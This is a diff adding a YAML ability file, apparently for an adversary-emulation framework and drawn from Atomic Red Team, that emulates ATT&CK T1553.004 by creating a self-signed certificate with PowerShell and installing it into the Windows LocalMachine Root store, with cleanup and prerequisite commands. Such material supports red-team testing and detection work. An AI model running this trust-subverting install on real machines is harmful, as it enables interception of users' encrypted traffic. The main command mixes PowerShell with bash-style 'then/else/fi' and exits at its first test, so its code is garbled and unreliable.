@@ -1,0 +1,56 @@
+- id: 76f49d86-5eb1-461a-a032-a480f86652f1
+  name: Install root CA on Windows
+  description: Creates a root CA with Powershell
+  tactic: defense-evasion
+  technique:
+    attack_id: T1553.004
+    name: 'Subvert Trust Controls: Install Root Certificate'
+  platforms:
+    windows:
+      psh:
+        command: 'if (Test-Path rootCA.cer) { exit 0 } else { exit 1 }; then : ; else
+          $cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation
+          cert:\LocalMachine\My; Export-Certificate -Type CERT -Cert  Cert:\LocalMachine\My\$($cert.Thumbprint)
+          -FilePath rootCA.cer; Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint)
+          | Remove-Item; fi; $cert = Import-Certificate -FilePath rootCA.cer -CertStoreLocation
+          Cert:\LocalMachine\My; Move-Item -Path $cert.PSPath -Destination "Cert:\LocalMachine\Root"'
+        cleanup: 'try {; $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation
+          Cert:\LocalMachine\My -ErrorAction Ignore; Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint)
+          -ErrorAction Ignore | Remove-Item -ErrorAction Ignore; Get-ChildItem Cert:\LocalMachine\Root\$($cert.Thumbprint)
+          -ErrorAction Ignore | Remove-Item -ErrorAction Ignore; }; catch { }'
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1553.004
+  - atomic-red-team
+  - defense-evasion
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      pfx_path:
+        description: Path of the certificate
+        type: path
+        default: rootCA.cer
+    dependencies:
+    - description: 'Verify the certificate exists. It generates if not on disk.
+
+        '
+      prereq_command: 'if (Test-Path #{pfx_path}) { exit 0 } else { exit 1 }
+
+        '
+      get_prereq_command: '$cert = New-SelfSignedCertificate -DnsName atomicredteam.com
+        -CertStoreLocation cert:\LocalMachine\My
+
+        Export-Certificate -Type CERT -Cert  Cert:\LocalMachine\My\$($cert.Thumbprint)
+        -FilePath #{pfx_path}
+
+        Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) | Remove-Item
+
+        '
+    technique_created: '2020-02-21T21:05:32.844Z'
+    atomic_guid: 76f49d86-5eb1-461a-a032-a480f86652f1
+    import_timestamp: '2025-06-24T11:15:01.263860Z'
